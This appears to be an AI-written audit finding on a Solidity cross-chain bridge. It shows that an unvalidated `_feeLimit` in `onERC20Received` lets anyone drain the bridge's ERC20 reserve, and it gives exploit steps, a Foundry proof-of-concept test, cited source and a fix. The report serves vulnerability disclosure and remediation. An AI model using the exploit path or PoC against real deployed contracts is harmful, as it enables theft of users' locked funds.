Let me read the full call chain carefully.

Now I have all the code needed to trace the full exploit path. Let me analyze it precisely.

**Key code facts:**

1. `onERC20Received` is `public` with no access control — `msg.sender` is passed as `_tokenAddress` to `_requestERC20Transfer`. [1](#0-0) 

2. `_requestERC20Transfer` only checks `onlyRegisteredToken(msg.sender)` and `onlyUnlockedToken(msg.sender)` — it does **not** validate that `_feeLimit` corresponds to tokens actually deposited. [2](#0-1) 

3. `_payERC20FeeAndRefundChange`: when `feeReceiver == address(0)` (the hardcoded default) **or** `feeOfERC20[token] == 0` (the default for any token), the first `if` is skipped entirely, and the else branch unconditionally transfers `_feeLimit` tokens to `from`. [3](#0-2) 

4. `feeReceiver` is initialized to `address(0)` in `BridgeFee`'s constructor, and `BridgeTransfer` passes `address(0)` to it. [4](#0-3) [5](#0-4) 

5. Token registration requires `onlyOwner`. [6](#0-5) 

---

**Exploit path analysis:**

The question's scenario requires a **registered malicious token** to call `onERC20Received`. Registering a token requires `onlyOwner` — this is a privileged operation. However, the underlying vulnerability is real and exploitable **permissionlessly** via any legitimately registered token that supports `transferAndCall` (ERC677-style), which is exactly what the bridge is designed to work with:

1. Attacker calls `registeredToken.transferAndCall(bridge, 1, abi.encode(attacker, someAddress, bridge_balance, ""))`
2. Token transfers 1 token to bridge, then calls `bridge.onERC20Received(attacker, someAddress, 1, bridge_balance, "")`
3. `_requestERC20Transfer(token, attacker, someAddress, 1, bridge_balance, "")` passes all guards
4. `_payERC20FeeAndRefundChange(attacker, token, bridge_balance)` is called
5. Since `feeReceiver == address(0)` (default) and `bridge_balance > 0`: `IERC20(token).safeTransfer(attacker, bridge_balance)` executes
6. Bridge is drained; attacker deposited 1 token and received `bridge_balance` tokens

The `_feeLimit` parameter is **never validated** against the amount actually deposited in the `onERC20Received` path. The `requestERC20Transfer` path correctly pulls `_value + _feeLimit` via `safeTransferFrom`, but `onERC20Received` has no such check. [7](#0-6) 

**Verdict:**

---

### Title
Unvalidated `_feeLimit` in `onERC20Received` Allows Complete Drain of Bridge ERC20 Token Reserve — (`contracts/service_chain/bridge/BridgeFee.sol`, `BridgeTransferERC20.sol`)

### Summary
`onERC20Received` accepts a caller-controlled `_feeLimit` that is never validated against the amount actually deposited. When `feeReceiver == address(0)` (the default) or `feeOfERC20[token] == 0` (the default for any token), `_payERC20FeeAndRefundChange` unconditionally transfers `_feeLimit` tokens to the caller-supplied `from` address. An attacker using any registered ERC677-style token can set `_feeLimit` to the bridge's entire token balance, depositing 1 token and withdrawing the full reserve.

### Finding Description
`_requestERC20Transfer` is called from `onERC20Received` with `_feeLimit` taken directly from the caller's argument with no on-chain check that `_feeLimit` tokens were actually transferred to the bridge. The `requestERC20Transfer` path correctly enforces this via `safeTransferFrom(msg.sender, address(this), _value.add(_feeLimit))`, but the `onERC20Received` path has no equivalent guard. `_payERC20FeeAndRefundChange` then uses `_feeLimit` as the refund amount, pulling from the bridge's existing token balance — which may include tokens deposited by other users.

### Impact Explanation
Complete drain of the bridge's locked ERC20 token reserve for any registered token. All user deposits locked in the bridge (lock/unlock mode) can be stolen in a single transaction. This is an unauthorized transfer of bridged assets — a direct match for the required impact gate.

### Likelihood Explanation
- `feeReceiver` defaults to `address(0)` and `feeOfERC20[token]` defaults to `0` — both conditions that trigger the vulnerable branch are the out-of-the-box state of any deployed bridge.
- The attack requires only a registered token that supports `transferAndCall` (ERC677), which is the standard token type the bridge is designed to accept.
- No privileged access, governance keys, or validator collusion is needed.

### Recommendation
In `_requestERC20Transfer`, when called from `onERC20Received`, validate that `_value + _feeLimit` does not exceed the amount actually received. The simplest fix is to record the bridge's token balance before and after the token's callback and cap `_feeLimit` to the difference, or require the token to transfer `_value + _feeLimit` before the callback is accepted (mirroring the `requestERC20Transfer` path).

### Proof of Concept
```solidity
// Foundry test sketch
function test_drainBridgeViaOnERC20Received() public {
    // Setup: bridge deployed with feeReceiver=address(0) (default), lock/unlock mode
    // registeredToken is an ERC677 token registered by the bridge owner
    // Bridge holds 1000e18 tokens from prior legitimate deposits

    uint256 bridgeBalance = registeredToken.balanceOf(address(bridge)); // 1000e18

    // Attacker deposits 1 token but claims feeLimit = entire bridge balance
    vm.prank(attacker);
    registeredToken.transferAndCall(
        address(bridge),
        1,  // _value: only 1 token actually transferred
        abi.encode(attacker, address(0x1), bridgeBalance, bytes(""))
        // _feeLimit = bridgeBalance
    );
    // onERC20Received -> _requestERC20Transfer -> _payERC20FeeAndRefundChange
    // feeReceiver==address(0), so: IERC20(token).safeTransfer(attacker, bridgeBalance)

    assertEq(registeredToken.balanceOf(address(bridge)), 1); // bridge drained
    assertEq(registeredToken.balanceOf(attacker), bridgeBalance); // attacker got it all
}
```

### Citations

**File:** contracts/service_chain/bridge/BridgeTransferERC20.sol (L76-108)
```text
    function _requestERC20Transfer(
        address _tokenAddress,
        address _from,
        address _to,
        uint256 _value,
        uint256 _feeLimit,
        bytes memory _extraData
    )
        internal
        onlyRegisteredToken(_tokenAddress)
        onlyUnlockedToken(_tokenAddress)
    {
        require(isRunning, "stopped bridge");
        require(_value > 0, "zero ERC20 token amount");

        uint256 fee = _payERC20FeeAndRefundChange(_from, _tokenAddress, _feeLimit);

        if (modeMintBurn) {
            ERC20Burnable(_tokenAddress).burn(_value);
        }

        emit RequestValueTransfer(
            TokenType.ERC20,
            _from,
            _to,
            _tokenAddress,
            _value,
            requestNonce,
            fee,
            _extraData
        );
        requestNonce++;
    }
```

**File:** contracts/service_chain/bridge/BridgeTransferERC20.sol (L111-121)
```text
    function onERC20Received(
        address _from,
        address _to,
        uint256 _value,
        uint256 _feeLimit,
        bytes memory _extraData
    )
        public
    {
        _requestERC20Transfer(msg.sender, _from, _to, _value, _feeLimit, _extraData);
    }
```

**File:** contracts/service_chain/bridge/BridgeTransferERC20.sol (L123-135)
```text
    // requestERC20Transfer requests transfer ERC20 to _to on relative chain.
    function requestERC20Transfer(
        address _tokenAddress,
        address _to,
        uint256 _value,
        uint256 _feeLimit,
        bytes memory _extraData
    )
        public
    {
        IERC20(_tokenAddress).safeTransferFrom(msg.sender, address(this), _value.add(_feeLimit));
        _requestERC20Transfer(_tokenAddress, msg.sender, _to, _value, _feeLimit, _extraData);
    }
```

**File:** contracts/service_chain/bridge/BridgeFee.sol (L29-39)
```text
    address payable public feeReceiver = address(0);
    uint256 public feeOfKLAY = 0;
    mapping (address => uint256) public feeOfERC20;

    event KLAYFeeChanged(uint256 indexed fee);
    event ERC20FeeChanged(address indexed token, uint256 indexed fee);
    event FeeReceiverChanged(address indexed feeReceiver);

    constructor(address payable _feeReceiver) internal {
        feeReceiver = _feeReceiver;
    }
```

**File:** contracts/service_chain/bridge/BridgeFee.sol (L68-88)
```text
    function _payERC20FeeAndRefundChange(address from, address _token, uint256 _feeLimit) internal returns(uint256) {
        uint256 fee = feeOfERC20[_token];

        if (feeReceiver != address(0) && fee > 0) {
            require(_feeLimit >= fee, "insufficient feeLimit");

            IERC20(_token).safeTransfer(feeReceiver, fee);

            uint256 feeRefund = _feeLimit.sub(fee);
            if (feeRefund > 0) {
                IERC20(_token).safeTransfer(from, feeRefund);
            }

            return fee;
        }

        if (_feeLimit > 0) {
            IERC20(_token).safeTransfer(from, _feeLimit);
        }
        return 0;
    }
```

**File:** contracts/service_chain/bridge/BridgeTransfer.sol (L46-48)
```text
    constructor(bool _modeMintBurn) BridgeFee(address(0)) internal {
        modeMintBurn = _modeMintBurn;
    }
```

**File:** contracts/service_chain/bridge/BridgeTokens.sol (L57-71)
```text
    function registerToken(address _token, address _cToken)
        external
        onlyOwner
        onlyNotRegisteredToken(_token)
    {
        // If _cToken == 0 then registeredTokens[_token] = 0, which confuses the
        // onlyRegisteredToken and onlyNotRegisteredToken modifiers.
        require(_cToken != address(0), "counterpart token address is zero");

        registeredTokens[_token] = _cToken;
        indexOfTokens[_token] = registeredTokenList.length;
        registeredTokenList.push(_token);

        emit TokenRegistered(_token);
    }
```
